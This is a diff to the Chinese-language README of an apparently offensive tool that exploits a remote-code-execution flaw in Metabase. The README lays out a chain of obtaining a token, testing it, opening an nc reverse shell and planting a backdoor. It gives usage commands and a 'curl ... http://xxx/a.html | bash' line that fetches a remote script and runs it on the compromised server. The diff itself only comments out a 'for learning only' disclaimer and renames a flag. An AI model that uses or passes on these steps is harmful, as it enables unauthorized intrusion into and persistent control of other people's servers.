@@ -1,6 +1,6 @@
 # metabase_exp
 metabase rce
-仅供学习使用
+#仅供学习使用
 漏洞利用过程为：获取token->测试token是否可用->尝试nc反弹->尝试自定义命令留后门
 
 
@@ -27,7 +27,7 @@ python3 metabase_exp.py exp -f poc生成的json文件 -i 服务器ip -p 服务�
 尝试自定义命令留后门
 我的思路是curl -A O  -o- -L http://xxx/a.html | bash -s 直接把要执行的命令写a.html里面，payload写太长会出问题不能执行
 
-python3 metabase_exp.py backdoor  -f/-u -t  json文件/ip token -p 你的payload
+python3 metabase_exp.py backdoor  -f/-u -t  json文件/ip token -payload 你的payload
 
 
 
